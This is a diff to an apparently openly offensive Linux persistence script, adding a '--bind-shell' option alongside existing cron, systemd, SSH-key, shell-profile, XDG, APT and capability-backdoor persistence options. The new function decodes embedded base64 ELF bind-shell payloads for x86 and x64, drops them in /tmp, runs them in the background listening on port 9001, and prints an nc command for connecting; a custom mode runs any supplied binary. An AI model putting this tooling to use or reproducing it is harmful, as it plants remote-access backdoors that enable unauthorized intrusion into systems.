@@ -29,50 +29,55 @@ check_root() {
 }
 
 usage_user() {
-	echo ""
-	echo -e "${RED}[!] Warning: More features are available when running as root.${NC}"
-	echo ""
-	echo "Low Privileged User Options:"
-	echo ""
-	echo "  --cron                      Cron job persistence"
-	echo "    --default                    Use default cron settings"
-	echo "        --ip <ip>                  Specify IP address"
-	echo "        --port <port>              Specify port number"
-	echo "  --ssh-key                   SSH key persistence"
-	echo "      --default                    Use default SSH key settings"
-	echo "  --systemd                   Systemd service persistence"
-	echo "      --default                    Use default systemd settings"
-	echo "          --ip <ip>                  Specify IP address"
-	echo "          --port <port>              Specify port number"
-	echo "      --custom                     Use custom systemd settings (make sure they are valid!)"
-	echo "          --path <path>                Specify custom service path (must end with .service)"
-	echo "          --command <command>          Specify custom persistence command (no validation)"
-	echo "          --timer                      Create systemd timer (1 minute interval)"
-	echo "  --at                         At job persistence"
-	echo "      --default                    Use default at settings"
-	echo "          --ip <ip>                  Specify IP address"
-	echo "          --port <port>              Specify port number"
-	echo "          --time <time>              Specify time for at job (e.g., now + 1 minute)"
-	echo "      --custom                     Use custom at settings"
-	echo "          --command <command>          Specify custom persistence command"
-	echo "          --time <time>              Specify time for at job (e.g., now + 1 minute)"
-	echo "  --shell-configuration         Shell profile persistence"
-	echo "      --default                    Use default profile settings"
-	echo "          --ip <ip>                  Specify IP address"
-	echo "          --port <port>              Specify port number"
-	echo "      --custom                     Use custom profile settings"
-	echo "          --file <file>                Specify custom profile file"
-	echo "          --command <command>          Specify custom persistence command"
-	echo "  --xdg                        XDG autostart persistence"
-	echo "      --default                    Use default XDG settings"
-	echo "          --ip <ip>                  Specify IP address"
-	echo "          --port <port>              Specify port number"
-	echo "      --custom                     Use custom XDG settings"
-	echo "          --file <file>                Specify custom desktop entry file"
-	echo "          --command <command>          Specify custom persistence command"
-	echo "  --authorized-keys            Authorized keys management"
-	echo "      --default                    Use default authorized keys settings"
-	echo "          --key <key>                Specify the public key"
+    echo ""
+    echo -e "${RED}[!] Warning: More features are available when running as root.${NC}"
+    echo ""
+    echo "Low Privileged User Options:"
+    echo ""
+    echo "  --cron                      Cron job persistence"
+    echo "    --default                    Use default cron settings"
+    echo "        --ip <ip>                  Specify IP address"
+    echo "        --port <port>              Specify port number"
+    echo "  --ssh-key                   SSH key persistence"
+    echo "      --default                    Use default SSH key settings"
+    echo "  --systemd                   Systemd service persistence"
+    echo "      --default                    Use default systemd settings"
+    echo "          --ip <ip>                  Specify IP address"
+    echo "          --port <port>              Specify port number"
+    echo "      --custom                     Use custom systemd settings (make sure they are valid!)"
+    echo "          --path <path>                Specify custom service path (must end with .service)"
+    echo "          --command <command>          Specify custom persistence command (no validation)"
+    echo "          --timer                      Create systemd timer (1 minute interval)"
+    echo "  --at                         At job persistence"
+    echo "      --default                    Use default at settings"
+    echo "          --ip <ip>                  Specify IP address"
+    echo "          --port <port>              Specify port number"
+    echo "          --time <time>              Specify time for at job (e.g., now + 1 minute)"
+    echo "      --custom                     Use custom at settings"
+    echo "          --command <command>          Specify custom persistence command"
+    echo "          --time <time>              Specify time for at job (e.g., now + 1 minute)"
+    echo "  --shell-configuration         Shell profile persistence"
+    echo "      --default                    Use default profile settings"
+    echo "          --ip <ip>                  Specify IP address"
+    echo "          --port <port>              Specify port number"
+    echo "      --custom                     Use custom profile settings"
+    echo "          --file <file>                Specify custom profile file"
+    echo "          --command <command>          Specify custom persistence command"
+    echo "  --xdg                        XDG autostart persistence"
+    echo "      --default                    Use default XDG settings"
+    echo "          --ip <ip>                  Specify IP address"
+    echo "          --port <port>              Specify port number"
+    echo "      --custom                     Use custom XDG settings"
+    echo "          --file <file>                Specify custom desktop entry file"
+    echo "          --command <command>          Specify custom persistence command"
+    echo "  --authorized-keys            Authorized keys management"
+    echo "      --default                    Use default authorized keys settings"
+    echo "          --key <key>                Specify the public key"
+    echo "  --bind-shell                 Setup a bind shell"
+    echo "      --default                    Use default bind shell settings"
+    echo "          --architecture <arch>       Specify architecture (x86 or x64)"
+    echo "      --custom                     Use custom bind shell binary"
+    echo "          --binary <binary>           Specify the path to the custom binary"
 }
 
 usage_root() {
@@ -187,6 +192,11 @@ usage_root() {
     echo "      --custom                     Use custom APT persistence settings"
     echo "          --command <command>          Specify custom persistence command"
     echo "          --path <path>                Specify custom path in /etc/apt/apt.conf.d/"
+    echo "  --bind-shell                 Setup a bind shell"
+    echo "      --default                    Use default bind shell settings"
+    echo "          --architecture <arch>       Specify architecture (x86 or x64)"
+    echo "      --custom                     Use custom bind shell binary"
+    echo "          --binary <binary>           Specify the path to the custom binary"
 }
 
 setup_systemd() {
@@ -1661,6 +1671,88 @@ setup_cap_backdoor() {
     fi
 }
 
+setup_bind_shell() {
+    local default=0
+    local custom=0
+    local architecture=""
+    local binary=""
+
+    while [[ "$1" != "" ]]; do
+        case $1 in
+            --default )
+                default=1
+                ;;
+            --custom )
+                custom=1
+                ;;
+            --architecture )
+                shift
+                architecture=$1
+                ;;
+            --binary )
+                shift
+                binary=$1
+                ;;
+            * )
+                echo "Invalid option for --bind-shell: $1"
+                exit 1
+        esac
+        shift
+    done
+
+    if [[ $default -eq 1 && $custom -eq 1 ]]; then
+        echo "Error: --default and --custom cannot be specified together."
+        exit 1
+    fi
+
+    if [[ $default -eq 1 ]]; then
+        if [[ -z $architecture ]]; then
+            echo "Error: --architecture (x64/x86) must be specified when using --default."
+            exit 1
+        fi
+
+        case $architecture in
+            x86 )
+                echo -n "f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAiiAAAA8AAAAAcAAAAAEAAAMdv341NDU2oCieGwZs2AW15SaAIAIylqEFFQieFqZljNgIlBBLMEsGbNgEOwZs2Ak1lqP1jNgEl5+GgvL3NoaC9iaW6J41BTieGwC82A" | base64 -d > /tmp/bd86
+                chmod +x /tmp/bd86
+                /tmp/bd86 &
+                echo "[+] Bind shell binary /tmp/bd86 created and executed in the background."
+                ;;
+            x64 )
+                echo -n "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAzgAAAAAAAAAkAQAAAAAAAAAQAAAAAAAAailYmWoCX2oBXg8FSJdSxwQkAgAjKUiJ5moQWmoxWA8FajJYDwVIMfZqK1gPBUiXagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU=" | base64 -d > /tmp/bd64
+                chmod +x /tmp/bd64
+                /tmp/bd64 &
+                echo "[+] Bind shell binary /tmp/bd64 created and executed in the background."
+                ;;
+            * )
+                echo "Error: Invalid architecture specified. Use one of x86 or x64"
+                exit 1
+        esac
+
+        echo "[+] The bind shell is listening on port 9001."
+        echo "[+] To interact with it from a different system, use: nc -nv <IP> 9001"
+
+    elif [[ $custom -eq 1 ]]; then
+        if [[ -z $binary ]]; then
+            echo "Error: --binary must be specified when using --custom."
+            exit 1
+        fi
+
+        if [[ ! -f $binary ]]; then
+            echo "Error: Specified binary does not exist: $binary"
+            exit 1
+        fi
+
+        chmod +x $binary
+        $binary &
+        echo "[+] Custom binary $binary granted execution privileges and executed in the background."
+
+    else
+        echo "Error: Either --default or --custom must be specified for --bind-shell."
+        exit 1
+    fi
+}
+
 main() {
 	local QUIET=0
 
@@ -1792,6 +1884,11 @@ main() {
             --cap-backdoor )
                 shift
                 setup_cap_backdoor "$@"
+                exit
+                ;;
+            --bind-shell )
+                shift
+                setup_bind_shell "$@"
                 exit
                 ;;
 			* )
